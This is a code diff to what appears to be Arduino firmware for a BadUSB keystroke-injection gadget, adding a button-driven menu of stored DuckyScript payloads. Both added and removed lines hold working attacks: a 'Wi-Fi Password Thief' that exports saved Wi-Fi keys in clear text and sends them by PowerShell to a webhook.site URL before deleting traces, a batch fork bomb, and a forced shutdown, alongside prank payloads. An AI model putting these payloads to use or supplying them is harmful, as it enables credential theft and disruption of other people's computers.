@@ -21,6 +21,9 @@
 #define TFT_RST 9
 #define TFT_DC 8
 #define SD_CS 7
+#define BTN0_PIN 20
+#define BTN1_PIN 21
+#define BTN2_PIN 22
 #define LED_PIN 25
 
 // software definitions
@@ -36,7 +39,197 @@
 #define KEY_SPACE         0xB4
 #define KEY_BACKSPACE     0xB2
 
+class ButtonHandler
+{
+    private:
+        int* pins; // malloc'd array of button pins
+        int* states; // states used for debouncing
+        int* lastdebounce; // last state change in milliseconds
+        const int DEBOUNCE = 25; // debounce milliseconds
+        
+    public:
+        ButtonHandler( int btnpin1, int btnpin2, int btnpin3 )
+        {
+            int num = 3;
+            this->pins = (int*) malloc( num );
+            this->pins[ 0 ] = btnpin1;
+            this->pins[ 1 ] = btnpin2;
+            this->pins[ 2 ] = btnpin3;
+            this->states = (int*) malloc( num );
+            this->states[ 0 ] = HIGH;
+            this->states[ 1 ] = HIGH;
+            this->states[ 2 ] = HIGH;
+            this->lastdebounce = (int*) malloc( num );
+            this->lastdebounce[ 0 ] = 0;
+            this->lastdebounce[ 1 ] = 0;
+            this->lastdebounce[ 2 ] = 0;
+            for( int i = 0; i < num; i ++ )
+                pinMode( this->pins[ i ], INPUT_PULLUP );
+        }
+
+        // raw undebounced read
+        int read( int btn )
+        {
+            return digitalRead( this->pins[ btn ] );
+        }
+
+        // debounced button press
+        bool pressed( int btn )
+        {
+            int press = this->read( btn );
+            if( press != this->states[ btn ] )
+            {
+                this->states[ btn ] = press;
+                this->lastdebounce[ btn ] = millis();
+            }
+            return ( ( this->states[ btn ] == LOW ) && ( ( millis() - this->lastdebounce[ btn ] ) > this->DEBOUNCE ) );
+        }
+};
+
+ButtonHandler btns = ButtonHandler( BTN0_PIN, BTN1_PIN, BTN2_PIN );
 Adafruit_ST7735 tft = Adafruit_ST7735( TFT_CS, TFT_DC, TFT_RST );
+
+// colors for drawing
+uint16_t bgcolor = ST77XX_BLACK;
+uint16_t textcolor = ST77XX_GREEN;
+
+// PROGMEM payloads variables
+const PROGMEM int PROGMEM_PAYLOAD_COUNT = 7;
+const PROGMEM String PROGMEM_PAYLOAD_NAMES[] = 
+{ 
+    "Power Down Now", 
+    "Timed Power Down", 
+    "Meow Forkbomb",
+    "Wi-Fi Password Thief",
+    "Rotate Screen",
+    "Rick Roll",
+    "Delay Scroll Test"
+};
+const PROGMEM String PROGMEM_PAYLOADS[] =
+{
+    // Power Down Now
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING cmd\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRING shutdown /f /s\n"
+    "ENTER\n",
+    // Timed Power Down
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING cmd\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "shutdown /f /s /t 3600\n"
+    "ENTER\n",
+    // Meow Forkbomb
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING cmd\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRING ( echo @echo off && echo :meow && echo echo meow! :3 && echo start %temp%/meow.bat && echo goto meow ) > %temp%/meow.bat\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING %temp%/meow.\n"
+    "ENTER\n",
+    // Wi-Fi Password Thief
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING cmd\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRING netsh wlan export profile key=clear\n"
+    "ENTER\n"
+    "DELAY 500\n"
+    "STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS\n"
+    "ENTER\n"
+    "STRING powershell Invoke-WebRequest -Uri https://webhook.site/69277a67-6fdc-457d-8c90-f3f9cfe1836a -Method POST -InFile Wi-Fi-PASS\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRING del Wi-* /s /f /q\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRING exit\n"
+    "ENTER\n",
+    // Rotate Screen
+    "CONTROL ESCAPE\n"
+    "DELAY 500\n"
+    "STRING display settings\n"
+    "DELAY 500\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 100\n"
+    "DOWNARROW\n"
+    "DOWNARROW\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "TAB\n"
+    "DELAY 100\n"
+    "ENTER\n",
+    // Rick Roll
+    "DELAY 200\n"
+    "GUI r\n"
+    "DELAY 50\n"
+    "STRING powershell.exe\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 50\n"
+    "STRING Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}\n"
+    "DELAY 150\n"
+    "ENTER\n"
+    "DELAY 50\n"
+    "STRING Set-Speaker -Volume 50\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 200\n"
+    "GUI r\n"
+    "DELAY 50\n"
+    "STRING https:\\www.youtube.com/watch?v=dQw4w9WgXcQ\n"
+    "DELAY 100\n"
+    "ENTER\n"
+    "DELAY 5000\n"
+    "STRING F\n",
+    // Delay Scroll Test
+    "DELAY 100                                 ;\n"
+    "DELAY 200\n"
+    "DELAY 300\n"
+    "DELAY 400\n"
+    "DELAY 500\n"
+    "DELAY 600\n"
+    "DELAY 700\n"
+    "DELAY 800\n"
+    "DELAY 900\n"
+    "DELAY 1000\n"
+    "DELAY 1100\n"
+    "DELAY 1200\n"
+    "DELAY 1300\n"
+    "DELAY 1400\n"
+    "DELAY 1500\n"
+    "DELAY 1600\n"
+    "DELAY 1700\n"
+    "DELAY 1800                               ;\n"
+    "DELAY 1900\n"
+    "DELAY 2000\n"
+    "DELAY 2100                                 ;\n"
+    "DELAY 2200\n"
+    "DELAY 2300\n"
+    "DELAY 2400\n"
+    "DELAY 2500\n"
+};
 
 void setup() {
     // init led pin
@@ -47,118 +240,97 @@ void setup() {
     // init tft screen
     tft.initR( INITR_BLACKTAB );
     tft.setRotation( SCREEN_ROTATION );
-    tft.fillScreen( ST77XX_BLACK ); // clear screen
+    tft.fillScreen( bgcolor ); // clear screen
 
     // Initialize control over keyboard
     Keyboard.begin();
 
-    // Arducky payload (set "" as last value!)
-    #define MEOW_FORKBOMB
-    //#define WIFI_PASSWORD_THIEF
-    //#define DELAY_SCROLL_TEST
+    // Small delay for screen and keyboard
+    delay( 500 );
 
-    #ifdef MEOW_FORKBOMB
-    String payload[] = {
-        "GUI r",
-        "DELAY 500",
-        "STRING cmd",
-        "ENTER",
-        "DELAY 1500",
-        "STRING ( echo @echo off && echo :meow && echo echo meow! :3 && echo start %temp%/meow.bat && echo goto meow ) > %temp%/meow.bat",
-        "ENTER",
-        "DELAY 500",
-        "STRING %temp%/meow.bat",
-        "ENTER",
-        ""
-    };
-    #endif
-
-    #ifdef WIFI_PASSWORD_THIEF
-    String payload[] = {
-        "GUI r",
-        "DELAY 500",
-        "STRING cmd",
-        "ENTER",
-        "DELAY 1500",
-        "STRING netsh wlan export profile key=clear",
-        "ENTER",
-        "DELAY 500",
-        "STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS",
-        "ENTER",
-        "STRING powershell Invoke-WebRequest -Uri https://webhook.site/69277a67-6fdc-457d-8c90-f3f9cfe1836a -Method POST -InFile Wi-Fi-PASS",
-        "ENTER",
-        "DELAY 1000",
-        "STRING del Wi-* /s /f /q",
-        "ENTER",
-        "DELAY 1500",
-        "STRING exit",
-        "ENTER",
-        ""
-    };
-    #endif
-
-    #ifdef DELAY_SCROLL_TEST
-    String payload[] = {
-        "DELAY 100                                 ;",
-        "DELAY 200",
-        "DELAY 300",
-        "DELAY 400",
-        "DELAY 500",
-        "DELAY 600",
-        "DELAY 700",
-        "DELAY 800",
-        "DELAY 900",
-        "DELAY 1000",
-        "DELAY 1100",
-        "DELAY 1200",
-        "DELAY 1300",
-        "DELAY 1400",
-        "DELAY 1500",
-        "DELAY 1600",
-        "DELAY 1700",
-        "DELAY 1800                                 ;",
-        "DELAY 1900",
-        "DELAY 2000",
-        "DELAY 2100                                 ;",
-        "DELAY 2200",
-        "DELAY 2300",
-        "DELAY 2400",
-        "DELAY 2500",
-        ""
-    };
-    #endif
-
-    delay( 3000 );
-
-    executePayload( payload );
-
-    // End control over keyboard
-    Keyboard.end();
+    while( true )
+        payloadMenuPROGMEM(); // forever loop progmem payload menu
 }
 
-// takes an array of duckyscript commands as strings
-// prints commands to tft as they are executed
-void executePayload( String payload[] )
+// menu for PROGMEM payloads because i cant find my free microsd card from micro center ;-;
+void payloadMenuPROGMEM()
 {
-    // prepare tft for prining payload text
-    tft.setTextColor( ST77XX_WHITE );
+    // prepare tft for printing menu text
+    tft.setTextColor( textcolor );
+    tft.setTextWrap( false );
+
+    int selected = 0;
+    bool exit = false;
+    do
+    {
+        // update menu
+        tft.fillScreen( bgcolor ); // clear screen
+        tft.setCursor( 0, 0 );
+        tft.print( "PROGMEM Payloads" ); // display menu label
+        for( int i = 0; i < PROGMEM_PAYLOAD_COUNT; i ++ ) // display payload names
+        {
+            tft.setCursor( 8, ( i + 2 ) * 8 );
+            tft.print( PROGMEM_PAYLOAD_NAMES[ i ] );
+        }
+        tft.setCursor( 0, ( selected + 2 ) * 8 );
+        tft.print( ">" ); // print cursor
+
+        bool up = false;
+        bool down = false;
+        // wait for input
+        while( !exit && !up && !down )
+        {
+            if( btns.pressed( 1 ) ) // execute current selection if center button pressed
+                exit = true;
+            while( btns.pressed( 0 ) ) // keep going in loop until press has stopped
+                up = true;
+            while( btns.pressed( 2 ) ) // keep going in loop until press has stopped
+                down = true;
+        }
+        // move selected number
+        if( up )
+            selected --;
+        else if( down )
+            selected ++;
+        // keep in bounds
+        if( selected < 0 )
+            selected = 0;
+        else if( selected >= PROGMEM_PAYLOAD_COUNT )
+            selected = PROGMEM_PAYLOAD_COUNT - 1;
+    } 
+    while( !exit ); // while not exit from menu
+
+    executePayload( PROGMEM_PAYLOADS[ selected ] );
+}
+
+// takes an newline sperated string of duckyscript commands
+// prints commands to tft as they are executed
+void executePayload( String payload )
+{
+    // prepare tft for printing payload text
+    tft.setTextColor( textcolor );
     tft.setTextWrap( true );
 
     // execute payload
     String line = "";
     int lineoffset = 0; // line offset caused by text wrapping/overflow
     String display = ""; // display string buffer
-    for( int i = 0; payload[ i ] != ""; i ++ ) // For each line in buffer
+    while( payload.length() > 1 ) // while there is still payload to execute
     {
         digitalWrite( LED_PIN, !digitalRead( LED_PIN ) ); // switch led state
-        tft.fillScreen( ST77XX_BLACK ); // clear screen
-        
+        tft.fillScreen( bgcolor ); // clear screen
+
+        // split payload
+        int payloadnewlineindex = payload.indexOf( "\n" );
+        String payloadline = payload.substring( 0, payloadnewlineindex ); // get current payload line
+        payload = payload.substring( payloadnewlineindex + 1 ); // chop off currently executing payload line
+
         // manage display buffer
-        display += payload[ i ] + "\n";
-        lineoffset += 1 + floor( ( payload[ i ].length() ) / 21 );
+        display += payloadline + "\n";
+        lineoffset += 1 + floor( payloadline.length() / 21 );
         while( lineoffset >= 21 )
         {
-            display = display.substring( min( display.indexOf( "\n" ), 20 ) + 1 );
+            display = display.substring( min( display.indexOf( "\n" ) + 1, 21 ) );
             lineoffset --;
         }
         
@@ -166,16 +338,22 @@ void executePayload( String payload[] )
         tft.setCursor( 0, 0 );
         tft.print( display );
         
-        line = payload[ i ];  // Get line from payload
-        processLine( line );  // Process script line by reading command and payload
+        processLine( payloadline );  // Process script line by reading command and payload
         //Keyboard.releaseAll(); // release all keys
+
+        while( btns.pressed( 1 ) ) {} // center button pause
     }
 
     // display that script is done
     delay( DELAY ); // delay a little bit for screen
     display += "done!";
-    display = display.substring( min( display.indexOf( "\n" ), 20 ) + 1 ); // get rid of first line
-    tft.fillScreen( ST77XX_BLACK ); // clear screen
+    lineoffset ++;
+    while( lineoffset >= 21 )
+    {   
+        display = display.substring( min( display.indexOf( "\n" ) + 1, 21 ) ); // get rid of first line
+        lineoffset --;
+    }
+    tft.fillScreen( bgcolor ); // clear screen
     tft.setCursor( 0, 0 );
     tft.print( display );
 }
